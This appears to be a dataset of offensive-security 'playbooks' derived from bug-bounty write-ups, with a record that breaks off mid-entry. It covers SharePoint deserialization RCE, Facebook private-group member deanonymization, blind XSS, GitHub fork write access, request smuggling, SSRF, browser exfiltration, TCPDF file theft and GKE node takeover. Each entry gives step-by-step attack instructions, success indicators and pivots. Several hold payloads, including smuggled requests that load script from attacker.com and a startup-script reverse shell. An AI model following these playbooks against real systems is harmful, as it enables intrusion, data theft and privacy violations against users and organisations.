playbooks.key_lesson: Always validate authorization for any data export or retrieval functionality by attempting to access data belonging to other users, even when authenticated as a different user.

meta.title: CVE-2021-27076: A Replay-Style Deserialization Attack Against SharePoint

trigger_conditions.when_to_apply: This vulnerability is applicable when an authenticated attacker can control serialized data that is processed by SharePoint's menu control, and when the attacker can replay this data in a different context.
prerequisites: Attacker must be authenticated to SharePoint.
Attacker must be able to intercept and replay HTTP requests.
Target SharePoint version must be vulnerable to CVE-2021-27076.
applicability_signals: SharePoint installation detected.
Authenticated user session can be established.
Discovery of endpoints that handle serialized menu data.
skip_if: Target system does not use SharePoint.
Authenticated access is not possible.
No identifiable mechanism for deserializing menu control data.

recon_steps: Step 1: Fingerprint the target to confirm it is a SharePoint instance by observing response headers like 'Microsoft-IIS' and specific HTML structures related to SharePoint.
Step 2: Identify an authenticated user and establish a session token.
attack_steps: Step 1: Intercept an HTTP request involving SharePoint's menu control (e.g., when saving or loading menu configurations).
Step 2: Analyze the request to identify the serialized data representing the menu.

Step 3: Craft a malicious serialized object that, when deserialized and executed, leads to Remote Code Execution (RCE). This typically involves using tools like ysoserial to generate a gadget chain for .NET deserialization.
Step 4: Replay the intercepted request with the malicious serialized data appended.
Step 5: Observe the target's response for signs of successful exploitation.
payloads_or_patterns: Serialized .NET object payload (generated using ysoserial or similar tools with a specific gadget chain for .NET deserialization).
tools_recommended: Burp Suite (for interception and replay)
ysoserial (for generating .NET deserialization payloads)
success_indicators: Execution of arbitrary code on the SharePoint server (e.g., creating a file, executing a command, establishing a reverse shell).
Specific error messages or unexpected behavior indicating successful deserialization and execution of the payload.
failure_indicators: HTTP 4xx or 5xx errors without signs of code execution.
The serialized payload is rejected or sanitized by the server.
No observable change on the server indicating code execution. Pivot: Try different gadget chains or look for other deserialization sinks.

playbooks.impact: Remote Code Execution (RCE) on the SharePoint server, allowing an attacker to compromise the server, access sensitive data, and potentially gain further access to the internal network.
playbooks.key_lesson: Always scrutinize deserialization sinks in web applications, especially when dealing with complex .NET applications like SharePoint, and understand how data integrity checks like message authentication can be bypassed through replay attacks.

meta.title: Voice Confusion When Commenting On Watch Party

affected_components: Watch Party commenting feature on iOS

trigger_conditions.when_to_apply: When a user is able to switch their identity (e.g., from a personal profile to a page profile) before commenting on a watch party.
prerequisites: User must be logged into Facebook.
Target user must be able to switch their commenting identity.
applicability_signals: Presence of a 'Switch Voice' or similar option when engaging with watch party features on iOS.
skip_if: No option to switch commenting identity is available.

recon_steps: Identify if the watch party feature allows users to switch their commenting identity from their personal profile to a page profile.
Attempt to reproduce the scenario described in the writeup by hosting a watch party and commenting from a switched identity.
attack_steps: Step 1: Host a watch party (Page A).
Step 2: User B, logged in, navigates to the watch party hosted by Page A.
Step 3: User B switches their commenting voice to be represented as Page B.
Step 4: User B, while acting as Page B, makes a comment within the watch party.
Step 5: Observe the comment's attribution to verify if it's shown as Page B or User B.
payloads_or_patterns: N/A (This is a functional bug due to improper state management)
tools_recommended: iOS device with Facebook app
Burp Suite (for observing traffic and identifying potential API calls related to identity switching and commenting)
success_indicators: Comment made while using Page B's identity is incorrectly attributed to User B instead of Page B.
failure_indicators: Comment is correctly attributed to Page B. Pivot: Investigate if other profile/page switching functionalities exhibit similar misattributions.

playbooks.impact: An attacker could impersonate a different user or page when commenting on watch parties, potentially leading to confusion, misinformation, or reputational damage by misattributing comments to unintended entities.
playbooks.key_lesson: Always validate that user identity switching mechanisms correctly update and enforce the intended persona across all user-generated content actions, including comments and posts.

meta.title: De-anonymize the members of a private Facebook Group as a non-member

trigger_conditions.when_to_apply: This technique is applicable when an attacker wants to determine if a specific user is a member of a private Facebook group, even if the attacker themselves is not a member.
prerequisites: Attacker has a Facebook account (can be unauthenticated for the purpose of sending the GraphQL query if the API allows it without session, or a basic authenticated account)
Attacker knows or can guess the actorID of the victim user
Attacker knows or can guess the groupID of the private Facebook group
applicability_signals: The presence of the CometHovercardQueryRendererQuery GraphQL endpoint or similar graphQL queries that can resolve user and group relationships.
The ability to observe response fields like 'WeakEntityReference' and 'StrongEntityReference' for user-group membership.
skip_if: GraphQL API consistently returns errors for requests without a valid session token.
Facebook implements strict rate limiting or IP blocking for unauthenticated GraphQL requests.
The specific GraphQL mutation is removed or significantly altered.

recon_steps: Step 1: Identify potential victim actorIDs (e.g., by observing URLs of public profiles or through other information disclosure vulnerabilities).
Step 2: Identify potential private group IDs (e.g., by observing URLs of public groups or through other enumeration techniques).

Step 3: Analyze network traffic for GraphQL requests made by Facebook when viewing user profiles or group members to identify the relevant mutation (CometHovercardQueryRendererQuery) and its structure.
attack_steps: Step 1: Craft a GraphQL query using the CometHovercardQueryRendererQuery mutation.
Step 2: Set the `actorID` variable in the query to the target victim's actorID.
Step 3: Set the `groupID` variable in the query to the target private group's ID.
Step 4: Send the crafted GraphQL query to the Facebook GraphQL endpoint.
Step 5: Analyze the response from the GraphQL API.
tools_recommended: Burp Suite or OWASP ZAP: To intercept, analyze, and modify GraphQL requests.
A custom script (Python, JavaScript): To automate the process of iterating through multiple `actorID`s and `groupID`s.
Facebook's Graph API Explorer (if applicable for testing GraphQL queries).
success_indicators: Response contains `"memberStatus": "StrongEntityReference"` for the target `actorID` in relation to the `groupID`, indicating the user is a member.
Response contains `"memberStatus": "WeakEntityReference"` for the target `actorID` in relation to the `groupID`, indicating the user is NOT a member.
failure_indicators: GraphQL query returns a generic error (e.g., 400 Bad Request, 500 Internal Server Error) without specific details about `memberStatus`. This might indicate an incorrect `groupID`, `actorID`, or a change in the API structure. Pivot to trying different `actorID` and `groupID` formats or looking for alternative GraphQL queries.

Response does not contain `memberStatus` field. This suggests the query structure is incorrect or the specific relationship is not exposed via this mutation for the given IDs. Try different known user and group IDs.

playbooks.impact: An attacker can enumerate members of private Facebook groups without being a member of the group themselves. This can lead to privacy violations, targeted social engineering, or the deanonymization of individuals participating in private communities.
playbooks.key_lesson: When interacting with graphQL APIs, always test for information disclosure by varying user and entity IDs, and carefully analyze response fields that indicate relationships or statuses between entities.

meta.title: Facebook Group Members Disclosure

trigger_conditions.when_to_apply: When an attacker wants to determine if a specific user is a member of a private Facebook group, and they have an authenticated Facebook account.
prerequisites: Attacker has an authenticated Facebook account.
Attacker knows the target user's actorID and the target group's groupID.
applicability_signals: Existence of the CometHovercardQueryRendererQuery GraphQL mutation.
Ability to modify the 'actorID' and 'groupID' parameters in GraphQL requests.
The presence of membership date information in the FbLite app for group members.
The disappearance of membership dates when a user leaves a group in FbLite.
skip_if: If the target group is public, membership is already visible and this attack is unnecessary.

recon_steps: Step 1: Identify the target group and obtain its 'groupID'.
Step 2: Identify the target user and obtain their 'actorID'. This may require additional reconnaissance or observing their interactions on Facebook.
Step 3: Note the response format of the CometHovercardQueryRendererQuery GraphQL mutation, specifically looking for 'WeakEntityReference' and 'StrongEntityReference'.
attack_steps: Step 1: As a non-member, construct a GraphQL request to the CometHovercardQueryRendererQuery mutation, substituting the target user's 'actorID' and the target group's 'groupID'.
Step 2: Send the crafted GraphQL request.
Step 3: Analyze the response. If 'StrongEntityReference' is present, the user is a member. If 'WeakEntityReference' is present, the user is not a member.
Step 4 (Bug 2): Use the FbLite app as User A to join the target private group.
Step 5: As User A, leave the group on PC. Observe membership dates of other users (User B, User C).
Step 6: As User B, leave the group on PC. Observe if User B's membership date disappears, while User C's remains.
Step 7: As User C, leave the group on PC. Observe if User C's membership date also disappears.
payloads_or_patterns: Bug 2 involves observing UI changes in the FbLite app, no specific string payload.
tools_recommended: Facebook's Graph API Explorer (or similar tool to craft and send GraphQL requests)
Burp Suite (for intercepting and modifying requests)
FbLite app (for Bug 2)
success_indicators: For Bug 1: Receiving 'StrongEntityReference' in the GraphQL response indicates group membership.
For Bug 2: The disappearance of a user's membership date in the FbLite app after they leave the group confirms the disclosure vulnerability.
failure_indicators: For Bug 1: Receiving only 'WeakEntityReference' consistently for all tested users suggests the mutation might not be accessible or that the target user is indeed not a member. Pivot to other GraphQL queries related to groups or members.
For Bug 2: If membership dates do not disappear when users leave the group, this specific approach to member disclosure may not be effective.

playbooks.impact: An attacker can enumerate members of private Facebook groups, violating user privacy. For Bug 2, an attacker can determine the membership status of specific users by observing the presence or absence of their membership dates in the FbLite app.
playbooks.key_lesson: Always test GraphQL mutations and API endpoints by substituting identifiers of different users and resources to check for information disclosure vulnerabilities, especially in privacy-sensitive contexts like private groups.

meta.title: [Google VRP] How I Get Blind XSS At Google With Dork (First Bounty and HOF )

trigger_conditions.when_to_apply: When a contact form is found on a Google subdomain that allows arbitrary input in fields and reflects that input in an administrative context.
prerequisites: Attacker has access to an XSS payload execution listener (e.g., XSSHunter, Burp Collaborator).
applicability_signals: Existence of contact forms on Google subdomains.
The presence of specific Google Dorks that reveal such forms (e.g., `site:support.google.com inurl:/contact/`).
skip_if: Contact forms do not exist or are heavily sanitized, preventing payload injection.
The target environment does not reflect user input in any observable way, even in an administrative backend.

recon_steps: Step 1: Use Google Dorking to find contact forms on Google subdomains. Example dork: `site:support.google.com inurl:/contact/`.
Step 2: Analyze the search results to identify specific contact form URLs. Example: `https://support.google.com/cloud/contact/prod_issue`.
attack_steps: Step 1: Navigate to the identified contact form URL.
Step 2: Populate the form fields (e.g., Subject, Full Description, Affected product) with an XSS payload designed to be logged or reflected in an administrative panel. Use an XSSHunter payload.
Step 3: Submit the form.
Step 4: Monitor the XSS listener (e.g., XSSHunter dashboard) for incoming requests, which indicate the payload has been executed.
tools_recommended: Google Search Engine for dorking.
XSSHunter or Burp Collaborator for payload listener.
success_indicators: A notification from XSSHunter indicating payload execution.
The logged payload appearing in an administrative interface of googleplex.com or a related subdomain.
failure_indicators: No callback received from XSSHunter after submitting the form.
Input fields show errors or are sanitized, preventing payload injection.
The target subdomain does not reflect or log the submitted input.

playbooks.impact: Execution of arbitrary JavaScript in the context of an administrative user accessing the googleplex.com subdomain. This could lead to the disclosure of sensitive administrative information, session hijacking, or further malicious actions within the administrative panel.
playbooks.key_lesson: Always test input fields on publicly accessible contact forms and feedback mechanisms for stored or reflected XSS vulnerabilities, as they can often lead to execution in administrative panels.

meta.title: Messing with GitHub's fork collaboration for fun and profit

trigger_conditions.when_to_apply: When an attacker can create a pull request from a branch in another user's repository to their own, and the target repository is itself a fork of another repository.
prerequisites: Attacker controls a GitHub account.
Attacker can create a fork of a target repository.
Target repository is public and is a fork of another repository.
Attacker can create a pull request from a branch in another user's repository to their own repository.
applicability_signals: The target repository UI displays 'forked from ...'.
The ability to create a pull request from any branch within a fork network is observed.
skip_if: The target repository is not a fork of another repository.
The GitHub REST API returns a 'Fork collab can't be granted by someone without permission' error when attempting to enable fork collaboration initially.
The GitHub REST API returns an 'Only the pull request author may change the maintainer_can_modify value' error when attempting to modify fork collaboration after PR creation.

recon_steps: Step 1: Identify public GitHub repositories that are forks of other repositories by observing the 'forked from ...' UI element.
Step 2: Confirm the ability to create a pull request from a branch in any repository within the same fork network to another repository.
attack_steps: Step 1: Create a pull request from a branch in 'User B's' repository (head branch) to 'Attacker's' repository (base repository), ensuring fork collaboration is disabled.
Step 2: Using the GitHub REST API, edit the created pull request to enable fork collaboration.
Step 3: Attempt to push changes to 'User B's' branch to confirm write access.
tools_recommended: GitHub CLI for repository operations and API interactions.
Burp Suite or similar proxy for intercepting and modifying API requests.
success_indicators: Successful push of code changes to 'User B's' branch without explicit permission from 'User B'.
The GitHub UI showing the 'Attacker' as having write access to 'User B's' fork branch.
failure_indicators: The GitHub REST API returning an error indicating that 'maintainer_can_modify' cannot be changed by the pull request author. This indicates the vulnerability is not present in this specific scenario (e.g., if the base repo is not a fork).
Inability to push changes to the victim's branch after enabling fork collaboration.

playbooks.impact: An attacker can gain write access to any public GitHub repository that is a fork of another repository, allowing them to arbitrarily modify or delete code, inject malicious content, or disrupt the project's development.
playbooks.key_lesson: When handling access control for collaborative features, always validate permissions not only at the time of initial feature enablement but also during subsequent modifications via APIs, and consider the relationship and ownership of the involved repositories.

meta.title: Exploiting HTTP Request Smuggling (TE.CL)— XSS to website takeover

trigger_conditions.when_to_apply: When a web application reflects user-controlled input from the User-Agent header and exhibits HTTP Request Smuggling vulnerabilities, specifically TE.CL.
prerequisites: Web server vulnerable to TE.CL HTTP Request Smuggling.
applicability_signals: User-Agent header reflects input leading to XSS.
Burp Suite's Smuggle probe detects HTTP Request Smuggling.
Web server's response to crafted requests indicates request desynchronization (e.g., 404 errors for non-existent endpoints in smuggled requests).
skip_if: No reflection in User-Agent header.
No HTTP Request Smuggling detected by tools or manual testing.
Web server correctly handles desynchronized requests without exploitable behavior.

recon_steps:
Step 1: Send a request with a crafted string in the User-Agent header (e.g., 'Exploitation') to confirm reflection: `GET / HTTP/1.1
User-Agent: Exploitation
Host: <TARGET_URL>

` and observe if 'Exploitation' is present in the response.
Step 2: Use Burp Suite's Smuggle probe on the target to automatically detect HTTP Request Smuggling vulnerabilities.
attack_steps:
Step 1: Confirm XSS in User-Agent header by sending a reflected XSS payload: `GET / HTTP/1.1
User-Agent: "><script>alert(1)</script>
Host: <TARGET_URL>

`. Observe if the script executes (e.g., alert box pops up).
Step 2: Disable Burp Suite's 'Update Content-Length' in Repeater to manually control the Content-Length header.

Step 3: Craft a TE.CL request using the provided calculator script or manually calculate the `Content-Length` and `Transfer-Encoding` headers. The first part of the request should be a legitimate request, followed by the smuggled malicious request.
Step 4: Inject a cross-site scripting payload into the User-Agent header of the *smuggled* request, targeting the front-end server's processing of subsequent requests.

Step 5: Send the crafted TE.CL request to the server and monitor for specific responses indicating successful smuggling and exploitation (e.g., 404 errors for injected paths, or successful execution of the smuggled JavaScript).

Step 6: For website takeover, inject a payload that includes a `<script src=http://attacker.com/script.js></script>` into the User-Agent header of the smuggled request, ensuring `attacker.com` is controlled by the attacker and hosts a malicious JavaScript file.
payloads_or_patterns:
GET / HTTP/1.1
User-Agent: "><script>alert(1)</script>
Host: <TARGET_URL>

GET / HTTP/1.1
Transfer-Encoding: chunked
Host: <TARGET_URL>
Content-Length: <CALCULATED_CONTENT_LENGTH>
User-Agent: "<script src=http://attacker.com/script.js></script>"

<CHUNK_SIZE_FOR_LEGIT_REQUEST>
<LEGIT_REQUEST_DATA>
<CHUNK_SIZE_FOR_SMUGGLED_REQUEST>
GET /404hopefully HTTP/1.1
Host: <TARGET_URL>

0

GET / HTTP/1.1
Transfer-Encoding: chunked
Host: <TARGET_URL>
Content-Length: <CALCULATED_CONTENT_LENGTH>

<CHUNK_SIZE_FOR_LEGIT_REQUEST>
<LEGIT_REQUEST_DATA>
<CHUNK_SIZE_FOR_SMUGGLED_REQUEST>
GET /404hopefully HTTP/1.1
Host: <TARGET_URL>

0
tools_recommended: Burp Suite (Repeater, Smuggle probe, Turbo Intruder)
Python script for TE.CL calculation (e.g., TECL_DesyncCalculator from the writeup)
success_indicators: Execution of JavaScript code from `attacker.com` in the victim's browser (e.g., cookie theft, session hijacking).
Receiving a 404 error for a path that was part of the smuggled request, indicating the front-end server forwarded the request to the back-end.
Successful execution of arbitrary JavaScript via the smuggled request's User-Agent header.
failure_indicators: No reflection of User-Agent input → technique not applicable.
No HTTP Request Smuggling detected → try other vulnerabilities.
Smuggled request results in 400 Bad Request or connection reset → incorrect `Content-Length` calculation or `Transfer-Encoding` parsing issue. Re-calculate and adjust.
No XSS payload execution after successful smuggling → XSS filter on the back-end or incorrect payload. Try different XSS payloads or encoding.

playbooks.impact: Website takeover by injecting malicious JavaScript into user sessions via HTTP Request Smuggling and reflected XSS in the User-Agent header, leading to session hijacking, cookie theft, or other client-side attacks.
playbooks.key_lesson: Always test for HTTP Request Smuggling when input is reflected in headers, as it can be chained with other vulnerabilities like XSS to achieve higher impact, including full website takeover.

meta.title: Exploiting HTTP Request Smuggling (TE.CL)— XSS to website takeover

affected_components: Any endpoint vulnerable to HTTP Request Smuggling

trigger_conditions.when_to_apply: When a web application reflects the User-Agent header and is vulnerable to HTTP Request Smuggling (TE.CL).
prerequisites: Target application must be vulnerable to TE.CL HTTP Request Smuggling.
Target application must reflect the User-Agent header.
applicability_signals: User-Agent header is reflected in the response.
Burp Suite's Smuggle probe detects potential HTTP Request Smuggling.
Application misinterprets Transfer-Encoding and Content-Length headers differently between front-end and back-end servers.
skip_if: Application correctly processes Transfer-Encoding and Content-Length headers.
WAF blocks or sanitizes the XSS payload in the User-Agent header.

recon_steps: Step 1: Send a request with a custom User-Agent header (e.g., 'User-Agent: TestAgent') and observe if it's reflected in the response.
Step 2: Use Burp Suite's Smuggle probe extension to automatically detect potential HTTP Request Smuggling vulnerabilities on various endpoints.
attack_steps: Step 1: Manually craft an HTTP request in Burp Suite's Repeater, ensuring 'Update Content-Length' is unchecked.

Step 2: Construct a TE.CL smuggling payload. This involves including both 'Transfer-Encoding: chunked' and 'Content-Length' headers, carefully calculating their values to split the request. The payload should include a legitimate-looking request followed by a smuggled request.
Step 3: Inject a JavaScript payload (e.g., `<script>alert('XSS')</script>`) into the User-Agent header of the smuggled request.
Step 4: To poison responses, append the crafted request with the XSS payload to the smuggled request. This can involve including a URL to an attacker-controlled script.
Step 5: Send the crafted request to Turbo Intruder or a similar tool to automate sending the smuggled request.
Step 6: Observe if a 404 error (indicating the smuggled request was processed by the back-end) or other unusual responses occur. If a 404 error occurs, it indicates successful smuggling.
Step 7: If the XSS payload is successfully delivered and executed in another user's browser (e.g., via a poisoned response), it achieves website takeover or further compromise.
payloads_or_patterns:
GET / HTTP/1.1
Host: <TARGET_URL>
Transfer-Encoding: chunked
Content-Length: <CALCULATED_CL>

<CHUNK_SIZE_FOR_LEGIT_REQ>
<LEGIT_REQ_DATA>
<CHUNK_SIZE_FOR_SMUGGLED_REQ>
GET / HTTP/1.1
User-Agent: "><script src=http://attacker.com/script.js></script>"

0
tools_recommended: Burp Suite (Repeater, Smuggle probe)
Burp Suite Turbo Intruder
Custom Python script for TECL Desync Calculation (e.g., kleiton0x00/TECL_DesyncCalculator)
success_indicators: Receiving a 404 error after sending the smuggled request, indicating the back-end server processed it.
Execution of the injected JavaScript payload in the victim's browser via a poisoned response (e.g., an alert box, or a script fetching from an attacker-controlled domain).
Observing the XSS payload being executed in the context of the target website for another user.
failure_indicators: No 404 error and standard responses, indicating successful processing of legitimate requests without smuggling.
WAF blocking the request or XSS payload.
Incorrectly calculated Content-Length or chunked encoding leading to request parsing errors.
If User-Agent is not reflected or sanitizes the payload, try other headers or techniques.

playbooks.impact: Website takeover by injecting arbitrary JavaScript into user sessions, allowing for session hijacking, data exfiltration, unauthorized actions, or redirection to malicious sites.
playbooks.key_lesson: Always test for HTTP Request Smuggling (TE.CL) when XSS is found in headers, as it can be escalated to a website takeover by poisoning user responses.

meta.title: SSRF Bypass With Quadzero In Google Cloud Monitoring

trigger_conditions.when_to_apply: When an authenticated user can create uptime checks and the target system uses regex to block certain local IP ranges but not '0.0.0.0'.
prerequisites: Authenticated access to Google Cloud Console
Ability to create uptime checks
applicability_signals: Presence of the '/monitoring/uptime' endpoint
Regex on hostname input for uptime checks that blocks IPs like 127.x.x.x, 169.x.x.x, 10.x.x.x, 172.x.x.x, 192.x.x.x, but allows 0.0.0.0.
skip_if: IP address validation strictly blocks '0.0.0.0'.

recon_steps: Navigate to https://console.cloud.google.com/monitoring/uptime
Observe IP address validation on the 'Target' hostname field for TCP checks.
attack_steps: Step 1: Create a new Uptime Check.
Step 2: Set 'Target' hostname to '0.0.0.0'.
Step 3: Set 'Port' to '22' (or another port for local services).
Step 4: Enable 'Content matching' for 'Response Content'.
Step 5: Set 'Response Content' to 'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10' (or a known banner for the target port).
Step 6: Click the 'TEST' button.
Step 7: Analyze the response. If it indicates 'SUCCESS' and the response time is very low (e.g., 0 ms), localhost was likely reached.

Step 8: Use brute-force or educated guesses on the 'Response Content' string to discover banners of local services by incrementally matching parts of the expected banner (e.g., 'SSH', 'SSH-2', 'SSH-2.0', etc.).
tools_recommended: Burp Suite Intruder: To automate the brute-forcing of the 'Response Content' string for banner grabbing.
Custom script (Python/Go): For more complex banner enumeration and interaction.
success_indicators: Response 'SUCCESS' with a very low response time (e.g., 0 ms) when testing the uptime check.
The 'checkPassed: true' flag in the JSON response indicating a match, and 'contentMismatch: false'.
failure_indicators: Response 'ERROR' or 'timed out' from the test, or a high response time. This could mean the target service is not running on that port, the IP validation is stricter than observed, or the expected banner is incorrect. Pivot to testing other ports or different known IP bypass techniques if applicable.

playbooks.impact: An attacker can perform Server-Side Requests (SSRs) directly to localhost, allowing them to discover and interact with internal services, potentially exfiltrating sensitive information or gaining further access by enumerating service banners.
playbooks.key_lesson: When IP address restrictions for SSRF are present, investigate less common IP notations like '0.0.0.0' and leverage response content validation to infer interaction with local services.

meta.title: Bypassing Chrome's URL restrictions

affected_components: URL parsing and validation logic for HTML content injection

trigger_conditions.when_to_apply: This technique is applicable when a web application allows unfiltered HTML injection and the target browser is a version of Google Chrome prior to 89.
prerequisites: The target web application must be vulnerable to HTML injection or a similar vulnerability that allows arbitrary HTML content to be rendered.
The target user must be using a version of Google Chrome older than 89.
applicability_signals: The presence of an HTML injection vulnerability in a target web application.

Confirmation that the target user is using a vulnerable version of Chrome (can be inferred if the attack fails on newer versions but succeeds on older ones, or if the user agent indicates an older version).
skip_if: The target user is using Chrome version 89 or newer.
The web application has robust output encoding or sanitization that prevents HTML injection.
The browser implements stricter URL validation for non-HTTP/HTTPS schemes.

recon_steps: Step 1: Identify potential HTML injection points within the target web application by fuzzing input fields with HTML tags like
Step 2: Confirm HTML injection by observing if injected tags are rendered or if they cause observable behavior changes.
attack_steps: Step 1: Craft an HTML payload that includes a `<meta http-equiv="refresh" content="0; URL=scheme://attacker-controlled-server/">` tag.
Step 2: Replace 'scheme' with a non-HTTP/HTTPS protocol like 'ftp' or 'gopher' (if supported by Chrome).
Step 3: Inject this payload into a vulnerable HTML field on the target web application.
Step 4: Monitor the attacker-controlled server for incoming connections from the target browser.
tools_recommended: Burp Suite: To identify and test for HTML injection vulnerabilities.
Netcat (nc): To set up a listening server for FTP or other protocols to capture incoming connections.
success_indicators: An incoming connection to the attacker-controlled server on the specified protocol (e.g., an FTP connection logged by netcat).
The connection attempt logs will contain parts of the HTML source code that were injected, indicating data exfiltration.
failure_indicators: No connection is received on the attacker-controlled server. This could mean the HTML injection is not possible, or Chrome's restrictions are still preventing the URL request.
If the browser blocks the request and shows a security warning related to the URL scheme.

playbooks.impact: Exfiltration of sensitive HTML content from the rendered page, which could include user data, tokens, or other sensitive information, by bypassing Chrome's URL validation for certain injection scenarios.
playbooks.key_lesson: When dealing with URL validation bypasses, consider alternative URL schemes (e.g., ftp://, gopher://) that might not be subject to the same restrictions as http/https.

meta.title: Exploiting a hidden and forgotten Bug

tech_stack_fingerprints: TCPDF Error in POST request response
TCPDF version embedded in PDF metadata

trigger_conditions.when_to_apply: When the target application has an HTML to PDF generation feature that is vulnerable to SSRF, and the backend PDF generation library is identified as TCPDF.
prerequisites: Attacker can inject HTML tags into the PDF generation input.
Attacker has a way to receive external requests (e.g., TCP tunnel, FTP server).
applicability_signals: HTML `` tag injection results in a TCP response.
HTML `<link>` tag injection with internal file paths (e.g., `/etc/passwd`) results in a TCPDF Error.
PDF metadata reveals the TCPDF version.
skip_if: No response from HTML tag injection.
TCPDF version is not vulnerable to CVE-2017-6100 or similar.
WAF blocks FTP traffic or payload injection.

recon_steps: Step 1: Inject various HTML tags (``, ``) into the HTML input for PDF generation. Observe responses for any external communication (e.g., to a TCP tunnel).
Step 2: Inject `<link>` tags with internal file paths (e.g., `/etc/passwd`) and analyze POST request responses for error messages. Look for 'TCPDF Error'.
attack_steps: Step 1: If a vulnerable TCPDF version is identified (e.g., < 6.2), attempt to exploit CVE-2017-6100.
Step 2: Set up a free FTP server (e.g., ftphosting.net).
Step 3: Craft a serialized payload for TCPDF that specifies the target internal file to be uploaded and the FTP server details.
Step 4: Inject the crafted payload into the HTML input for PDF generation.
Step 5: Verify if the internal file (e.g., `/etc/passwd`) has been uploaded to the attacker's FTP server.
payloads_or_patterns: Payload generation requires manual crafting based on TCPDF documentation and the specific version's vulnerability (e.g., CVE-2017-6100). A generic template is not feasible due to serialization and version-specifics. Example structure for CVE-2017-6100 might involve constructing a serialized object that guides TCPDF to upload a file.
tools_recommended: Burp Suite: To intercept and analyze HTTP requests/responses, and to manage session cookies.
TCP Tunneling tool (e.g., `ngrok`, `serveo`): To capture out-of-band interactions from HTML tags.
FTP Server: A free FTP hosting service or a self-hosted FTP server to receive the uploaded files.
success_indicators: The target internal file (e.g., `/etc/passwd`) is found on the attacker's FTP server.
PDF metadata reveals sensitive information or allows further exploitation.
failure_indicators: No response from HTML injection attempts.
No 'TCPDF Error' or similar indicative errors.
PDF metadata does not reveal TCPDF version or reveals a patched version.
FTP upload fails or the file is not found on the FTP server. Pivot: Try other SSRF vectors or alternative file paths if applicable.

playbooks.impact: Remote Code Execution (via file upload to FTP, potentially leading to further server compromise) or sensitive data disclosure (e.g., `/etc/passwd`, configuration files).
playbooks.key_lesson: Always analyze the metadata of generated documents (like PDFs) for embedded version information that could reveal known vulnerabilities, and test the capabilities of document generation libraries for SSRF and file exfiltration.

meta.title: GKE Autopilot Node Compromise via SSH Metadata

trigger_conditions.when_to_apply: When an attacker has the `compute.projects.setCommonInstanceMetadata` permission for the GCP project and can identify GKE Autopilot node IP addresses.
prerequisites: Attacker possesses `compute.projects.setCommonInstanceMetadata` permission.
Attacker can obtain the IP addresses of GKE Autopilot nodes (e.g., via `kubectl get node -o wide`).
applicability_signals: Target is a GKE Autopilot cluster.
SSH configuration on nodes does not restrict tunneling.
Compute metadata SSH keys list is configured and can be modified.
skip_if: Attacker lacks `compute.projects.setCommonInstanceMetadata` permission.
All SSH tunnels are blocked by network policies.
Nodes are configured with shells other than `/sbin/nologin` that also restrict tunneling.

recon_steps: Step 1: Identify GKE Autopilot nodes and their IP addresses using `kubectl get node -o wide`.
Step 2: Verify that SSH tunneling is not restricted on the target nodes by attempting to establish a basic SSH connection and probing for metadata service access.
attack_steps: Step 1: Use the `compute.projects.setCommonInstanceMetadata` permission to set project-wide SSH keys that include the attacker's public SSH key.
Step 2: Set up a SOCKS proxy to a target GKE Autopilot node IP address using the provided `socks.sh` script or a similar method.
Step 3: Use the SOCKS proxy to access the node's compute metadata service and download the `kube-env` attribute.
Step 4: Extract the TPM key and certificate from the `kube-env` attribute.
Step 5: Create a Certificate Signing Request (CSR) for `OU=system:masters CN=kubernetes-admin` using the extracted TPM key and certificate.
Step 6: Submit the CSR to the Kubernetes API.
Step 7: Approve the CSR with a Kubernetes Engine Admin user (this user is exempted from Autopilot gatekeeper policies for CSR approval).
Step 8: Use the newly signed certificate to launch a privileged pod on the compromised node.
payloads_or_patterns: SSH public key added to project metadata
Metadata service access via proxy: `curl http://localhost:<local_port>/computeMetadata/v1/instance/attributes/kube-env -H 'Metadata-Flavor: Google'`
CSR generation commands using OpenSSL and TPM tools
Kubernetes API commands for CSR submission and approval (e.g., `kubectl create --raw /apis/certificates.k8s.io/v1beta1/certificatesigningrequests`)
tools_recommended: kubectl: To list nodes and interact with the Kubernetes API.
ssh: To establish SOCKS proxy tunnels.
curl: To interact with the metadata service via the proxy.
OpenSSL: For CSR generation.
GCP Console: To manage project metadata and SSH keys.
socks.sh script (provided in writeup): To automate SOCKS proxy setup and metadata extraction.
success_indicators: Successful SSH connection to the node with the attacker's key.
Successful retrieval of the `kube-env` attribute from the metadata service.
Successful creation and approval of a `kubernetes-admin` certificate.
Successful deployment of a privileged pod on the GKE Autopilot node.
Attacker gains root-level access to the node.
failure_indicators: SSH connection fails: Target node is not accessible via SSH or the added SSH key is not recognized. Pivot: Investigate network firewalls or alternative authentication methods.
Metadata service is inaccessible via proxy: The node's SSH configuration might be more restrictive than described, or metadata access is blocked. Pivot: Look for other services exposed on the node.

CSR approval fails: The Kubernetes cluster might have additional security measures or the 'Kubernetes Engine Admin' user role is insufficient. Pivot: Research alternative CSR profiles or escalation paths.

Privileged pod fails to start: The GKE Autopilot's security policies might still prevent privileged pods despite node compromise. Pivot: Explore alternative exploitation vectors, such as accessing secrets directly from the compromised node.

playbooks.impact: An attacker can gain privileged access to GKE Autopilot nodes, allowing them to read all secrets within the cluster (regardless of their initial access level), explore the attack surface of the Autopilot control plane, and potentially exfiltrate sensitive data or cause service disruptions.
playbooks.key_lesson: Always verify the effectiveness of default security controls in managed Kubernetes environments like GKE Autopilot, as misconfigurations in underlying cloud provider permissions (e.g., `compute.projects.setCommonInstanceMetadata`) can lead to significant privilege escalation.

meta.title: GKE Autopilot Node Compromise via startup-script

trigger_conditions.when_to_apply: This technique applies when an attacker has the `compute.projects.setCommonInstanceMetadata` permission within a Google Cloud project where GKE Autopilot clusters are deployed.
prerequisites: Attacker possesses `compute.projects.setCommonInstanceMetadata` IAM permission on the GCP project.
GKE Autopilot cluster exists or can be created within the target GCP project.
applicability_signals: Observation of GKE Autopilot clusters within a GCP project.
Confirmation of `compute.projects.setCommonInstanceMetadata` permission for the attacker's service account or user.
skip_if: Attacker lacks `compute.projects.setCommonInstanceMetadata` permission.
All GKE Autopilot nodes have a specific `startup-script` defined in their instance metadata, overriding project-level settings.

recon_steps: Step 1: Identify GCP projects associated with the target organization.
Step 2: Enumerate IAM permissions for the attacker's service account or user within these projects, specifically looking for `compute.projects.setCommonInstanceMetadata`.
attack_steps: Step 1: Create a malicious shell script (e.g., `script.sh`) containing arbitrary code, such as a reverse shell payload.
Step 2: Upload the `script.sh` file to a location accessible by the attacker.
Step 3: Use `gcloud compute project-info add-metadata --metadata-from-file startup-script=script.sh` command to set the project-wide startup script.
Step 4: Create a new GKE Autopilot cluster or trigger a node recreation/reboot for existing nodes within the target project.
